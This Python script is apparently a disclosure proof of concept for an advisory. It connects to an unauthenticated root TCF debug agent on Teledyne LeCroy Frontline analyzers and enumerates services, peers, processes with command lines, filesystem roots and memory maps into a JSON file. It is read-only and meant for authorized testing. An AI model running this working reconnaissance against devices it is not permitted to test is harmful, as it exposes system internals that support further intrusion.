#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-3.0-only
"""
x240_tcf_enum.py: Enumerate the unauthenticated Xilinx TCF debug agent.

Read-only reconnaissance of the TCF agent on TCP/1534: captures the advertised service set from the agent's Hello, records the agent identity and peers, walks the running process list through the SysMonitor service (name, parent, owner, state, and command line per process), notes the Processes, ProcessesV1 and RunControl contexts, lists the FileSystem roots, and samples a MemoryMap. Everything is written to a single JSON file plus a printed summary.

Per the TCF Service Locator spec a client Hello is sent at channel open, otherwise the Xilinx agent will not dispatch commands.

Target  : Teledyne LeCroy Frontline X240 / X240i / X500 / X500e
Finding : Unauthenticated TCF debug agent (TCP/1534) running as root
Advisory: TDY-PSG-2026-001 (CVE pending)
Author  : Erwin Karincic (Dollarhyde)

Authorized testing only. Use against equipment you own or are explicitly permitted to test.

Usage:
    python x240_tcf_enum.py [host]                # default 10.10.0.240

TCF protocol references:
    https://wiki.eclipse.org/TCF/Service_Locator
    https://wiki.eclipse.org/TCF/Service_Processes
    https://wiki.eclipse.org/TCF/Service_SysMonitor
    https://wiki.eclipse.org/TCF/Service_FileSystem
    https://wiki.eclipse.org/TCF/Service_MemoryMap
"""

import socket
import sys
import json
import datetime
import logging

PORT = 1534
EOM = b"\x03\x01"

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("tcf-enum")


class TCFClient:
    """Minimal blocking TCF client. One outstanding command at a time."""

    def __init__(self, host, port=PORT, timeout=8.0):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(timeout)
        self.sock.connect((host, port))
        self.token_counter = 0
        self.recv_buf = b""
        self.hello_services = None
        self.events = []

        # Announce ourselves so the agent starts dispatching commands.
        self.sock.sendall(b"E\x00Locator\x00Hello\x00[]\x00" + EOM)
        self._drain_initial()

    def _drain_initial(self):
        self.sock.settimeout(2.0)
        try:
            while True:
                chunk = self.sock.recv(8192)
                if not chunk:
                    break
                self.recv_buf += chunk
                if EOM in self.recv_buf and len(chunk) < 8192:
                    break
        except socket.timeout:
            pass
        self.sock.settimeout(8.0)
        while EOM in self.recv_buf:
            msg, self.recv_buf = self._pop_message()
            self._process_unsolicited(msg)

    def _pop_message(self):
        idx = self.recv_buf.index(EOM)
        return self.recv_buf[:idx], self.recv_buf[idx + len(EOM):]

    def _process_unsolicited(self, msg):
        fields = msg.split(b"\x00")
        if not fields:
            return
        kind = fields[0]
        # Agent Hello event: E <NUL> Locator <NUL> Hello <NUL> <services_json>
        if (kind == b"E" and len(fields) >= 4
                and fields[1] == b"Locator" and fields[2] == b"Hello"):
            try:
                self.hello_services = json.loads(fields[3].decode())
                log.info(f"Hello received: {len(self.hello_services)} services advertised")
            except (json.JSONDecodeError, UnicodeDecodeError) as e:
                log.warning(f"Could not parse Hello services: {e}")
        elif kind == b"E":
            self.events.append([f.decode(errors="replace") for f in fields if f])

    def _next_token(self):
        self.token_counter += 1
        return str(self.token_counter).encode()

    def call(self, service, command, *args, timeout=6.0):
        token = self._next_token()
        parts = [b"C", token, service.encode(), command.encode()]
        for a in args:
            parts.append(json.dumps(a).encode())
        self.sock.sendall(b"\x00".join(parts) + b"\x00" + EOM)

        self.sock.settimeout(timeout)
        while True:
            while EOM not in self.recv_buf:
                try:
                    chunk = self.sock.recv(8192)
                except socket.timeout:
                    return {"errno": "timeout", "result": None}
                if not chunk:
                    return {"errno": "connection closed", "result": None}
                self.recv_buf += chunk

            reply, self.recv_buf = self._pop_message()
            fields = reply.split(b"\x00")
            if not fields:
                continue
            # Only the reply carrying our exact token counts; a late reply from a
            # prior timed-out call carries an older token and is discarded here,
            # which keeps the command and reply streams from drifting out of sync.
            if fields[0] == b"R" and len(fields) >= 4 and fields[1] == token:
                def _json(b):
                    if not b:
                        return None
                    try:
                        return json.loads(b.decode())
                    except (json.JSONDecodeError, UnicodeDecodeError):
                        return b.decode(errors="replace")
                return {"errno": _json(fields[2]), "result": _json(fields[3])}
            self._process_unsolicited(reply)

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


def result_of(reply):
    return reply.get("result") if isinstance(reply, dict) else None


def children_count(tcf, service, *args):
    return len(result_of(tcf.call(service, "getChildren", *args)) or [])


def walk_processes(tcf):
    """Build a process table from SysMonitor: name, parent, owner, state, command line."""
    pids = result_of(tcf.call("SysMonitor", "getChildren", None)) or []
    procs = []
    for pid in pids:
        ctx = result_of(tcf.call("SysMonitor", "getContext", pid)) or {}
        cmd = result_of(tcf.call("SysMonitor", "getCommandLine", pid))
        procs.append({
            "id": pid,
            "pid": ctx.get("PID"),
            "ppid": ctx.get("PPID"),
            "user": ctx.get("UserName"),
            "state": ctx.get("State"),
            "name": ctx.get("File"),
            "cmdline": " ".join(cmd) if isinstance(cmd, list) and cmd else "",
        })
    procs.sort(key=lambda p: p["pid"] if isinstance(p["pid"], int) else 1 << 30)
    return procs


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "10.10.0.240"
    out = {"host": host, "started": datetime.datetime.now().isoformat()}

    log.info(f"Connecting to TCF agent at {host}:{PORT}")
    try:
        tcf = TCFClient(host, timeout=8)
    except OSError as e:
        log.error(f"Connect failed: {e}")
        return

    out["hello_services"] = tcf.hello_services

    log.info("Locator.getAgentID")
    out["agent_id"] = tcf.call("Locator", "getAgentID")
    log.info("Locator.getPeers")
    out["peers"] = tcf.call("Locator", "getPeers")

    log.info("SysMonitor: walking the process list")
    procs = walk_processes(tcf)
    out["processes"] = procs
    log.info(f"  {len(procs)} processes")

    out["service_contexts"] = {
        "Processes": children_count(tcf, "Processes", None, False),
        "ProcessesV1": children_count(tcf, "ProcessesV1", None, False),
        "RunControl": children_count(tcf, "RunControl", None),
    }
    log.info(f"  Processes={out['service_contexts']['Processes']} "
             f"ProcessesV1={out['service_contexts']['ProcessesV1']} "
             f"RunControl={out['service_contexts']['RunControl']}")

    log.info("FileSystem.roots")
    out["fs_roots"] = tcf.call("FileSystem", "roots")

    log.info("MemoryMap.get (sample of first 3 processes)")
    out["memory_maps"] = {}
    for p in procs[:3]:
        out["memory_maps"][p["id"]] = tcf.call("MemoryMap", "get", p["id"])

    tcf.close()
    out["ended"] = datetime.datetime.now().isoformat()

    stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    path = f"x240_tcf_{stamp}.json"
    with open(path, "w") as f:
        json.dump(out, f, indent=2, default=str)

    print("\n" + "=" * 72)
    print(f"TCF agent @ {host}:{PORT}")
    print("=" * 72)

    services = out.get("hello_services") or []
    if services:
        print(f"\nServices advertised ({len(services)}):")
        line = "  "
        for s in services:
            if len(line) + len(s) + 2 > 70:
                print(line.rstrip())
                line = "  "
            line += s + ", "
        print(line.rstrip().rstrip(","))

    aid = result_of(out["agent_id"])
    if aid:
        print(f"\nAgent ID: {aid}")

    peers = result_of(out["peers"]) or []
    if isinstance(peers, list) and peers:
        print(f"\nPeers ({len(peers)}):")
        for p in peers[:5]:
            if isinstance(p, dict):
                print(f"  {p.get('Name', '?'):18s} {p.get('TransportName')}://{p.get('Host')}:{p.get('Port')}")

    if procs:
        print(f"\nProcesses ({len(procs)}, running as root unless noted):")
        print(f"  {'PID':>5}  {'PPID':>5}  {'USER':<6} {'S':<1}  {'NAME / COMMAND'}")
        for p in procs:
            ppid = p["ppid"] if p["ppid"] not in (None, 0) else "-"
            name = p["cmdline"] or p["name"] or "?"
            print(f"  {str(p['pid']):>5}  {str(ppid):>5}  {str(p['user'] or '?'):<6} "
                  f"{str(p['state'] or '?'):<1}  {name[:44]}")

    print(f"\nFull data: {path}")


if __name__ == "__main__":
    main()
